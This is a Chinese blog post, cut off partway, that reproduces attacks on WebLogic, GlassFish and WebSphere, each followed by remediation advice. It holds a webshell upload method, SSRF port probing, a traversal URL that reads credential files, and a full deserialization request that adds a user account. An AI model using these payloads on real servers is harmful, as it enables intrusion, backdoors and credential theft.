+<p>访问 ws_utc/config.do，设置Work Home Dir为ws_utc应用的静态文件css目录<code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css</code>，因为访问这个目录是无需权限的，提交后，点击左侧 安全-&gt; 添加，然后上传Webshell。<br><img src="/2019/03/04/middleware/CVE-2018-2894-01.png" alt="CVE-2018-2894-01"></p>
+<p>点击提交并抓包，获取响应数据包中的时间戳。<br><img src="/2019/03/04/middleware/CVE-2018-2894-02.png" alt="CVE-2018-2894-02"></p>
+<p>然后访问 <code>http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：<br><img src="/2019/03/04/middleware/CVE-2018-2894-03.png" alt="CVE-2018-2894-03"></p>
+<p>访问 ws_utc/begin.do，点击右上角的文件夹，上传Webshell，点击提交，并抓包。<br><img src="/2019/03/04/middleware/CVE-2018-2894-04.png" alt="CVE-2018-2894-04"></p>
+<p>在返回数据包中得到Webshell路径。<br><img src="/2019/03/04/middleware/CVE-2018-2894-05.png" alt="CVE-2018-2894-05"></p>
+<p>然后访问<code>http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp</code><br><img src="/2019/03/04/middleware/CVE-2018-2894-06.png" alt="CVE-2018-2894-06"></p>
+<p>Note:<br>1）<strong>ws_utc/begin.do 使用的工作目录是在ws_utc/config.do中设置的Work Home Dir。</strong><br>2）利用需要知道部署应用的web目录。<br>3）在生产模式下默认不开启，在后台开启之后，需要认证<br><img src="/2019/03/04/middleware/CVE-2018-2894-08.png" alt="CVE-2018-2894-08"></p>
+<h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><p>启动生产模式，<br>编辑domain路径下的setDomainEnv.cmd文件，将set PRODUCTION_MODE= 更改为 set PRODUCTION_MODE=true<br><code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\setDomainEnv.cmd</code><br>目前(2019/06/07) 生产模式下 已取消这两处上传文件的地方。<br><img src="/2019/03/04/middleware/CVE-2018-2894-07.png" alt="CVE-2018-2894-07"></p>
+<h2 id="Weblogic-SSRF漏洞-（CVE-2014-4210）"><a href="#Weblogic-SSRF漏洞-（CVE-2014-4210）" class="headerlink" title="Weblogic SSRF漏洞 （CVE-2014-4210）"></a>Weblogic SSRF漏洞 （CVE-2014-4210）</h2><p>影响版本：10.0.2.0, 10.3.6.0</p>
+<p>访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞，填写任意信息，如下<br><img src="/2019/03/04/middleware/CVE-2014-4210-01.png" alt="CVE-2014-4210-01"></p>
+<p>点击Search，并抓包，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET。<br><img src="/2019/03/04/middleware/CVE-2014-4210-02.png" alt="CVE-2014-4210-02"></p>
+<p>参数operator为SSRF的可控参数，将其更改为开放的端口，如<code>http://127.0.0.1:7001/</code>，将返回error code<br><img src="/2019/03/04/middleware/CVE-2014-4210-03.png" alt="CVE-2014-4210-03"></p>
+<p>若开放端口为HTTP协议，则会返回did not have a valid SOAP content-type。<br><img src="/2019/03/04/middleware/CVE-2014-4210-05.png" alt="CVE-2014-4210-05"></p>
+<p>访问不存在的端口，将返回<code>could not connect over HTTP to server</code><br><img src="/2019/03/04/middleware/CVE-2014-4210-04.png" alt="CVE-2014-4210-04"></p>
+<p>通过 返回数据包 中的错误信息，即可探测内网状态。</p>
+<h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><p>删除SearchPublicRegistries.jsp文件或修改SearchPublicRegistries.jsp文件后缀为不解析后缀，如SearchPublicRegistries.jspxxx，后重启Weblogic，再次访问，如下：<br><img src="/2019/03/04/middleware/CVE-2014-4210-06.png" alt="CVE-2014-4210-06"><br>SearchPublicRegistries.jsp路径为：<br><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war</code></p>
+<h2 id="Weblogic-弱口令-amp-amp-后台getshell"><a href="#Weblogic-弱口令-amp-amp-后台getshell" class="headerlink" title="Weblogic 弱口令 &amp;&amp; 后台getshell"></a>Weblogic 弱口令 &amp;&amp; 后台getshell</h2><p>弱口令参考：<a href="https://cirt.net/passwords?criteria=WebLogic" target="_blank" rel="external">https://cirt.net/passwords?criteria=WebLogic</a></p>
+<p>访问<code>http://127.0.0.1:7001/console</code><br>自动重定向到<code>http://127.0.0.1:7001/console/login/LoginForm.jsp</code>，使用弱口令登陆后台。</p>
+<p>点击部署，进一步点击右边的安装。<br><img src="/2019/03/04/middleware/weblogic04.png" alt="weblogic04"></p>
+<p>点击上载文件，<br><img src="/2019/03/04/middleware/weblogic05.png" alt="weblogic05"></p>
+<p>选择war包，点击下一步<br><img src="/2019/03/04/middleware/weblogic06.png" alt="weblogic06"></p>
+<p>上传完成以后选中你上传的文件,点击下一步<br><img src="/2019/03/04/middleware/weblogic07.png" alt="weblogic07"></p>
+<p>选中作为应用程序安装，点击下一步<br><img src="/2019/03/04/middleware/weblogic08.png" alt="weblogic08"></p>
+<p>然后直接点击完成即可<br><img src="/2019/03/04/middleware/weblogic09.png" alt="weblogic09"></p>
+<p>选用我们安装的应用，点击启动即可。<br><img src="/2019/03/04/middleware/weblogic10.png" alt="weblogic10"></p>
+<p>访问：<code>http://ip:port/[war包名]/[包名内文件名]</code><br><img src="/2019/03/04/middleware/weblogic11.png" alt="weblogic11"></p>
+<h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><p>避免后台弱口令。</p>
+<h1 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h1><p>GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。</p>
+<p>默认端口：8080（Web应用端口，即网站内容），4848（GlassFish管理中心）</p>
+<p>默认返回的指纹信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Server: GlassFish Server Open Source Edition  4.1.2</div><div class="line"></div><div class="line">X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1.2  Java/Oracle Corporation/1.8)</div></pre></td></tr></table></figure></p>
+<p><a href="https://download.java.net/glassfish/4.1.2/release/glassfish-4.1.2.zip" target="_blank" rel="external">下载4.1.2版本</a></p>
+<p>解压后，进入glassfish/bin目录下打开CMD窗口输入<code>asadmin start-domain</code>启动glassfish<br><img src="/2019/03/04/middleware/GlassFish01.png" alt="GlassFish01"></p>
+<p>asadmin stop-domain 停止glassfish</p>
+<h2 id="GlassFish-Directory-Traversal（CVE-2017-1000028）"><a href="#GlassFish-Directory-Traversal（CVE-2017-1000028）" class="headerlink" title="GlassFish Directory Traversal（CVE-2017-1000028）"></a>GlassFish Directory Traversal（CVE-2017-1000028）</h2><p>java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的<code>/</code>（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。</p>
+<p>计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模板后转义。<br>UTF8编码模板如下</p>
+<table>
+<thead>
+<tr>
+<th>字节数</th>
+<th>大小范围（十进制）</th>
+<th>字节1</th>
+<th>字节2</th>
+<th>字节3</th>
+<th>字节4</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>U + 0000~ U + 007F（0~127）</td>
+<td>0xxxxxxx</td>
+<td>None</td>
+<td>None</td>
+<td>None</td>
+</tr>
+<tr>
+<td>2</td>
+<td>U + 0080~ U + 07FF（128~2047）</td>
+<td>110xxxxx</td>
+<td>10xxxxxx</td>
+<td>None</td>
+<td>None</td>
+</tr>
+<tr>
+<td>3</td>
+<td>U + 0800~ U + 0FFF（2048~65535）</td>
+<td>1110xxxx</td>
+<td>10xxxxxx</td>
+<td>10xxxxxx</td>
+<td>None</td>
+</tr>
+<tr>
+<td>4</td>
+<td>U + 10000 ~ U + 10FFFF(65536~‭1114111)</td>
+<td>11110xxx</td>
+<td>10xxxxxx</td>
+<td>10xxxxxx</td>
+<td>10xxxxxx</td>
+</tr>
+</tbody>
+</table>
+<p>C0AF 转换位二进制为 ‭‭110 00000 10 101111‬  ，110开头去掉摸板后为00000 101111 转换为10进制为47，ASSCI为<code>/</code>.</p>
+<p>受影响版本：&lt;=4.1.2版本</p>
+<p>启动GlassFish后 ，访问<br><code>http://your-ip:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</code>, 发现成功读取win.ini文件。<br><img src="/2019/03/04/middleware/CVE-2017-1000028-01.png" alt="CVE-2017-1000028-01"></p>
+<p>Note:<strong>如果在你的机器上不能成功读取，请自行添加..%c0%af</strong></p>
+<p>读admin-keyfile文件，该文件是储存admin账号密码的文件,爆破。<br>位置在<code>glassfish/domains/domain1/config/admin-keyfile</code><br><img src="/2019/03/04/middleware/GlassFish05.png" alt="GlassFish05"></p>
+<h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级GlassFish最新版本。</p>
+<h2 id="GlassFish-后台Getshell"><a href="#GlassFish-后台Getshell" class="headerlink" title="GlassFish 后台Getshell"></a>GlassFish 后台Getshell</h2><p>进入后台后 Applications，右边的deploy<br><img src="/2019/03/04/middleware/GlassFish02.png" alt="GlassFish02"></p>
+<p>选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。<br><img src="/2019/03/04/middleware/GlassFish03.png" alt="GlassFish03"></p>
+<p>访问<code>http://127.0.0.1:8080/[Context Root]/[war包内的filename]</code><br><img src="/2019/03/04/middleware/GlassFish04.png" alt="GlassFish04"></p>
+<p>Note: <strong>如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。Configuration Error Secure Admin must be enabled to access the DAS remotely</strong></p>
+<h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.不开放后台给外网，<br>2.若开放 密码强度需设置 包含 大写字母，小写字母，数字，特殊字符，且长度大于10位。</p>
+<h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1><p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。</p>
+<p>下载安装7.0 WebSphere</p>
+<p>指纹:<br>Server: WebSphere Application Server/7.0</p>
+<p>登录页面：<br><a href="http://127.0.0.1:9060/ibm/console/logon.jsp" target="_blank" rel="external">http://127.0.0.1:9060/ibm/console/logon.jsp</a><br><a href="https://127.0.0.1:9043/ibm/console/logon.jsp" target="_blank" rel="external">https://127.0.0.1:9043/ibm/console/logon.jsp</a></p>
+<h2 id="Java反序列化-CVE-2015-7450）"><a href="#Java反序列化-CVE-2015-7450）" class="headerlink" title="Java反序列化(CVE-2015-7450）"></a>Java反序列化(CVE-2015-7450）</h2><p>访问8880端口，出现如下界面，则可能存在Java反序列化漏洞<br><img src="/2019/03/04/middleware/CVE-2015-7450-01.png" alt="CVE-2015-7450-01"></p>
+<p>访问8880，并抓包，然后替换如下Payload进行复现，注意更改下Host.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: 192.168.31.12:8880</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Content-Type: text/xml</div><div class="line">SOAPAction: urn:AdminService</div><div class="line">Content-Length: 8886</div><div class="line"></div><div class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;</div><div class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</div><div class="line">&lt;SOAP-ENV:Header ns0:JMXConnectorContext=&quot;rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4&quot; xmlns:ns0=&quot;admin&quot; ns0:WASRemoteRuntimeVersion=&quot;8.5.5.7&quot; ns0:JMXMessageVersion=&quot;1.2.0&quot; ns0:JMXVersion=&quot;1.2.0&quot;&gt;</div><div class="line">&lt;/SOAP-ENV:Header&gt;</div><div class="line">&lt;SOAP-ENV:Body&gt;</div><div class="line">&lt;ns1:invoke xmlns:ns1=&quot;urn:AdminService&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</div><div class="line">&lt;objectname xsi:type=&quot;ns1:javax.management.ObjectName&quot;&gt;rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==&lt;/objectname&gt;</div><div class="line">&lt;operationname xsi:type=&quot;xsd:string&quot;&gt;getUnsavedChanges&lt;/operationname&gt;</div><div class="line">&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFW5ldCB1c2VyIGx4aCBseGggL2FkZHQABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAABB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6&lt;/params&gt;</div><div class="line">&lt;signature xsi:type=&quot;ns1:[Ljava.lang.String;&quot;&gt;rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=&lt;/signature&gt;</div><div class="line">&lt;/ns1:invoke&gt;</div><div class="line">&lt;/SOAP-ENV:Body&gt;</div><div 